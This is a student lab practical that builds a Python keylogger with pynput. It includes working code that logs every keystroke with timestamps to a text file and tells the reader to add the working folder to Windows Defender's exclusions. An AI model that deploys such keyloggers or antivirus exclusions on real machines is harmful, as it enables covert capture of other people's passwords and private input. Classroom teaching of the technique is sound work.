@@ -1,0 +1,30 @@
+Practical  no 9
+Aim:Create a Simple Keylogger using Python
+(1)Open your Windows Command Prompt change your directory to the location where python software is installed and type "pip install pynput".To install all the necessary modules .
+ 
+(2) Create a new folder on desktop.  
+Go to start -> Windows Security -> Virus and threat protection -> Virus and threat protection setting -> Exclusion -> Add or remove exclusion -> Add an exclusion.
+Add the newly created desktop folder in an exclusion.
+Add below python file in that folder save that file and give the name is “main.py”.
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+(3) Go to python idle and type the following code:
+
+from pynput.keyboard import Key, Listener
+import logging
+# if no name it gets into an empty string
+log_dir = ""
+# This is a basic logging function
+logging.basicConfig(filename=(log_dir+"my_log.txt"), level=logging.DEBUG, format='%(asctime)s:%(message)s:')
+# This is from the library
+def on_press(key):
+	logging.info(str(key))
+# This says, listener is on
+with Listener(on_press=on_press) as listener:
+	listener.join()
+ 
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+(4)Run your program and type some text on the ouput console
+ 
+(5)Search for the text file name my_log in your python folder which you have created . you will be able to see the see the record of each and every key which is being pressed along with the date and time
+ 
+
